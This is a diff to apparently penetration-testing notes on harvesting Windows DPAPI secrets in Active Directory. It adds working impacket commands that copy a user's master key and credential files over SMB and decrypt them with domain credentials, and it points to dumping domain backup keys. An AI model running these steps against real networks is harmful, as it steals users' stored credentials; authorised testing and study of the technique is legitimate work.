@@ -40,9 +40,37 @@ References:
 - [ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/dpapi](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/dpapi)
 - [thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
 
-# Dump domain backup key
+# Manually
 
-As domain admin obtain the domain backup key from a DC.
+~~~
+❯ mkdir ./masterkeys ./credentials
+❯ impacket-smbclient corp.local/jdoeadm:'passw0rd1'@ws01.corp.local
+# use c$
+# cd /users/pentest1/appdata/roaming/microsoft/protect
+# ls
+-rw-rw-rw-         24  Fri Sep 15 15:06:34 2023 CREDHIST
+drw-rw-rw-          0  Fri Sep 15 15:06:34 2023 S-1-5-21-1111111111-2222222222-333333333-44444
+-rw-rw-rw-         76  Fri Sep 15 15:06:34 2023 SYNCHIST
+# cd S-1-5-21-1111111111-2222222222-333333333-44444
+# mget *
+# exit
+❯ popd
+❯ pushd ./credentials
+❯ impacket-smbclient corp.local/jdoeadm:'passw0rd1'@ws01.corp.local
+# use c$
+# cd /users/pentest1/appdata/local/microsoft/credentials
+# mget *
+# cd /users/pentest1/appdata/roaming/microsoft/credentials
+# mget *
+# exit
+❯ popd
+❯ masterkey="$(impacket-dpapi masterkey -t corp.local/jdoe:'passw0rd2'@dc01.corp.local -file ./masterkeys/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee | rg --replace '$1' '^Decrypted key: (.+)$')"
+❯ for cred in ./credentials/*; do impacket-dpapi credential -file $cred -key $masterkey; done
+~~~
+
+# Dump domain backup keys
+
+As domain admin obtain the domain backup keys from a DC.
 It can be used to decrypt all user master key files.
 
 === "[[notes/tools/mimikatz]]"
